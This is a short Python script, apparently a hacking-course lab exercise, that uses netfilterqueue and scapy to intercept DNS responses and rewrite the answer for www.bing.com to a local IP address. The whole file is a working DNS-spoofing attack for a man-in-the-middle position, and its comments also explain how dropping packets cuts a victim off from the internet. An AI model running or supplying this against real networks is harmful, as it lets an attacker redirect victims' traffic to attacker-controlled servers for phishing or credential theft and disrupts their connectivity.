#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.DNSRR):
		qname = scapy_packet[scapy.DNSQR].qname
		if 'www.bing.com' in qname:
			print('[+] Spoofing target ')
			answer = scapy.DNSRR(rrname=qname,rdata='192.168.6.128')
			scapy_packet[scapy.DNS].an = answer
			scapy_packet[scapy.DNS].ancount = 1

			del scapy_packet[scapy.IP].len
			del scapy_packet[scapy.IP].chksum
			del scapy_packet[scapy.UDP].len
			del scapy_packet[scapy.UDP].chksum
			packet.set_payload(str(scapy_packet))
			#print(scapy_packet.show())
	#packet.drop() # this will recieve all the packet but not deliver to destination. This will result no internet connection to destination

	packet.accept() # this will accept the packet and allow the destination to recieve responce from router

queue = netfilterqueue.NetfilterQueue()
queue.bind(0,process_packet)
queue.run()